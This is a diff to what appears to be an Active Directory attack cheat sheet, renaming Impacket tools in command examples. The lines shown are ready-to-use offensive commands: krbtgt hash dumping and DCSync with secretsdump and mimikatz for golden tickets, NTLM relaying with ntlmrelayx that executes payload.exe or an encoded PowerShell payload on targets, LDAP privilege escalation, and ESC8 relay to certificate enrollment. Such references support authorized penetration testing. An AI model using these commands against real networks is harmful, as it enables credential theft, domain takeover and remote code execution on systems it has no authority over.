@@ -128,7 +128,7 @@ john --format=krb5asrep asrep.txt --wordlist=wordlist.txt
 ### Golden Ticket (T1558.001)
 ```bash
 # Get krbtgt hash (requires domain compromise)
-secretsdump.py {domain}/{admin}@{dc_ip}
+impacket-secretsdump {domain}/{admin}@{dc_ip}
 mimikatz # lsadump::dcsync /domain:{domain} /user:krbtgt
 
 # Create golden ticket
@@ -182,12 +182,12 @@ impacket-getST -spn cifs/{target} -impersonate Administrator {domain}/{user} -ha
 responder -I eth0 -wv
 
 # Setup ntlmrelayx
-ntlmrelayx.py -tf targets.txt -smb2support
-ntlmrelayx.py -t ldap://{dc_ip} --escalate-user {user}
+impacket-ntlmrelayx -tf targets.txt -smb2support
+impacket-ntlmrelayx -t ldap://{dc_ip} --escalate-user {user}
 
 # Relay to specific targets
-ntlmrelayx.py -t smb://{target} -e payload.exe
-ntlmrelayx.py -t http://{target}/endpoint -c "powershell -e {encoded_payload}"
+impacket-ntlmrelayx -t smb://{target} -e payload.exe
+impacket-ntlmrelayx -t http://{target}/endpoint -c "powershell -e {encoded_payload}"
 ```
 
 ### Pass-the-Hash (T1550.002)
@@ -222,8 +222,8 @@ impacket-psexec {domain}/{user}@{target} -k -no-pass
 # Requirements: Replicating Directory Changes permissions
 
 # Using secretsdump
-secretsdump.py {domain}/{user}:{password}@{dc_ip}
-secretsdump.py {domain}/{user}@{dc_ip} -hashes {lm}:{ntlm}
+impacket-secretsdump {domain}/{user}:{password}@{dc_ip}
+impacket-secretsdump {domain}/{user}@{dc_ip} -hashes {lm}:{ntlm}
 
 # Using mimikatz
 lsadump::dcsync /domain:{domain} /all
@@ -231,7 +231,7 @@ lsadump::dcsync /domain:{domain} /user:krbtgt
 lsadump::dcsync /domain:{domain} /user:Administrator
 
 # Extract specific accounts
-secretsdump.py {domain}/{user}@{dc_ip} -just-dc-user Administrator
+impacket-secretsdump {domain}/{user}@{dc_ip} -just-dc-user Administrator
 ```
 
 ## Lateral Movement
@@ -359,7 +359,7 @@ certipy auth -pfx administrator.pfx -dc-ip {dc_ip}
 ### ESC8 - NTLM Relay to ADCS
 ```bash
 # Setup relay to CA web enrollment
-ntlmrelayx.py -t http://{ca}/certsrv/certfnsh.asp --adcs --template DomainController
+impacket-ntlmrelayx -t http://{ca}/certsrv/certfnsh.asp --adcs --template DomainController
 ```
 
 ## Common AD Vulnerabilities (2025)
